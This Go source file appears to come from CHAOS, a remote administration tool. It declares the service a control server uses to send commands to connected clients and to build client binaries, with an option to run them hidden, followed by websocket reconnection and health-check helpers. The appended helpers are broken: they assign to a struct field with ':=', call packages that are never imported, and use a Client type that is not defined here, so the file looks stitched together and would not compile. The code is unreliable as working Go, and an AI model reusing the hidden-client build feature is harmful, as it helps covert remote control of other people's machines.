package client

import (
    "time"
	"context"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
)

type SendCommandInput struct {
	ClientID  string
	Command   string
	Parameter string
	Request   string
}

type SendCommandOutput struct {
	Response string
}

type BuildClientBinaryInput struct {
	ServerAddress, ServerPort, Filename string
	RunHidden                           bool
	OSTarget                            system.OSType
}

func (b BuildClientBinaryInput) GetServerAddress() string {
	return utils.SanitizeUrl(b.ServerAddress)
}

func (b BuildClientBinaryInput) GetServerPort() string {
	return utils.SanitizeUrl(b.ServerPort)
}

func (b BuildClientBinaryInput) GetFilename() string {
	return utils.SanitizeString(b.Filename)
}

type Service interface {
	AddConnection(clientID string, connection *websocket.Conn) error
	GetConnection(clientID string) (*websocket.Conn, bool)
	RemoveConnection(clientID string) error
	SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error)
	BuildClient(BuildClientBinaryInput) (string, error)
}

// function to handle reconnection
func (c *Client) reconnect() error {
    backoff := time.Second
    for {
        c.conn, _, err := websocket.DefaultDialer.Dial(c.url, nil)
        if err == nil {
            return nil
        }
        if backoff > time.Minute {
            return err
        }
        time.Sleep(backoff)
        backoff *= 2
    }
}

// Modify the main loop to handle unexpected termination
func (c *Client) run() {
    for {
        err := c.readPump()
        if err != nil {
            if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
                // Log the error here
                log.Printf("Unexpected websocket closure: %v", err)
            }
            // Attempt to reconnect
            if err := c.reconnect(); err != nil {
                log.Printf("Failed to reconnect: %v", err)
                return
            }
            // Reset any necessary client state here
        }
    }
}

// Modify the health check and device request functions
func (c *Client) sendHealthCheck() error {
    if c.conn == nil {
        return errors.New("Connection is not established")
    }
    return c.conn.WriteMessage(websocket.TextMessage, []byte("GET /health"))
}

func (c *Client) sendDeviceRequest() error {
    if c.conn == nil {
        return errors.New("Connection is not established")
    }
    return c.conn.WriteMessage(websocket.TextMessage, []byte("POST /device"))
}

func connectWithRetry(url string, maxAttempts int) (*websocket.Conn, error) {
    var conn *websocket.Conn
    var err error
    for attempt := 1; attempt <= maxAttempts; attempt++ {
        conn, _, err = websocket.DefaultDialer.Dial(url, nil)
        if err == nil {
            return conn, nil
        }
        log.Printf("Connection attempt %d failed: %v. Retrying...", attempt, err)
        time.Sleep(time.Second * time.Duration(attempt))
    }
    return nil, fmt.Errorf("failed to establish connection after %d attempts", maxAttempts)
}